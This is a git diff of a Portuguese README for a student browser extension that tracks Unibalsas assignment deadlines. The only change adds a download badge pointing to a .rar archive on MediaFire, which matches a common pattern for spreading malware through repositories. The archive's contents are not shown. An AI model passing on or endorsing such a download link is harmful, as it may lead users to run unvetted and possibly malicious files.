@@ -1,4 +1,7 @@
 # Extensão de Tarefas - Unibalsas 
+
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://www.mediafire.com/file/5a2hcbup9qq2bdk/ub-task-extension.rar/file)
+
 Esta extensão foi feita incorporando a API "[ub-task-api](https://github.com/piedro404/ub-task-api/tree/main)" no meu repostitorio. Esta extensão vem como ideia para Unibalsas de um possivel aplicação que inovaria a forma de que seus alunos acessem sua atividades, ajundo na vizualização e gerenciamento dos prazos das tarefas e TED's.
 
 OBS.: Projeto é somente um teste, a API que alimenta a aplicação é provissoria, podendo acarretar a erros.
